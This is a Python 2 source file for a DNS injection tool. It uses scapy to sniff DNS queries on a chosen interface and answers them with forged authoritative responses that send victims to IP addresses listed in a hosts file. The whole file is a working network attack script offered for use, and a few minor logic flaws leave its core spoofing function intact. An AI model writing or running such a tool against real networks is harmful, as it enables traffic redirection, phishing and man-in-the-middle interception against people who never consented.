#! /usr/bin/python

from scapy.all import *
from optparse import OptionParser
import netifaces
from netifaces import  ifaddresses, AF_INET

# http://www.cs.dartmouth.edu/~sergey/netreads/local/reliable-dns-spoofing-with-python-scapy-nfqueue.html
# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib

class DnsInject:
    def __init__(self, interface, hosts, expression):
        self.interface = interface

        if self.interface is None:
            interfaces_list = netifaces.interfaces()
            interfaces_list.remove("lo")
            for interface in interfaces_list:
                addresses = [ i['addr'] for i in ifaddresses(interface).setdefault(AF_INET, [{'addr': 'No IP addr'}])]
                if addresses != "No IP addr":
                    self.interface = interface
        self.ip = str(self.get_local_ip())
        self.host = hosts
        self.expression = expression
        self.host_dict = {}
        if self.host is not None:
            self.parse_host()

    def parse_host(self):
        if os.path.exists(self.host):
            file = open(self.host, 'r')
            # check file exists or not
            for line in file.readlines():
                ip, address = line.split()
                self.host_dict[address] = ip
            file.close()

    def start_dnsspoof(self):

        def dns_callback(packet):

            if packet.haslayer(DNSQR) and packet.haslayer(DNS) and packet[DNS].qr == 0:

                if packet[DNS].qd.qname in self.host_dict and self.host_dict is not None:
                    local_ip = str(self.host_dict[packet[DNS].qd.qname])
                elif self.host_dict is None:
                    local_ip = self.ip
                else:
                    return

                if packet.haslayer(UDP) and packet.haslayer(IP):
                    spoofed_packet = \
                        IP(dst=packet[IP].src,
                           src=packet[IP].dst) / \
                        UDP(dport=packet[UDP].sport,
                            sport=packet[UDP].dport) / \
                        DNS(id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                                qr=1, \
                            an=DNSRR(
                                rrname=packet[DNS].qd.qname,
                                ttl=10,
                                rdata=local_ip)
                            )
                    send(spoofed_packet)
                    print 'Sent:', spoofed_packet.summary()
                elif packet.haslayer(TCP) and packet.haslayer(IP):
                    spoofed_packet = \
                        IP(dst=packet[IP].src,
                           src=packet[IP].dst) / \
                        TCP(dport=packet[TCP].sport,
                            sport=packet[TCP].dport) / \
                        DNS(id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                            qr=1, \
                            an=DNSRR(
                                rrname=packet[DNS].qd.qname,
                                ttl=10,
                                rdata=local_ip)
                            )
                    send(spoofed_packet)
                    print 'Sent:', spoofed_packet.summary()


        sniff(
            filter=self.expression,
            prn=dns_callback,
            store=0,
            iface=str(self.interface)
        )

    def get_local_ip(self):

        netifaces.ifaddresses(self.interface)
        ip = netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']
        return ip


if __name__ == '__main__':
    optparser = OptionParser()
    optparser.set_conflict_handler("resolve")
    optparser.add_option("-i", "--interface", dest="interface", help="interface")
    optparser.add_option("-h", "--hosts", dest="hosts", help="file with a list of hosts")

    (options, args) = optparser.parse_args()
    expression = " ".join(args)

    dnsinject = DnsInject(options.interface,
                          options.hosts,
                          expression
                          )

    dnsinject.start_dnsspoof()
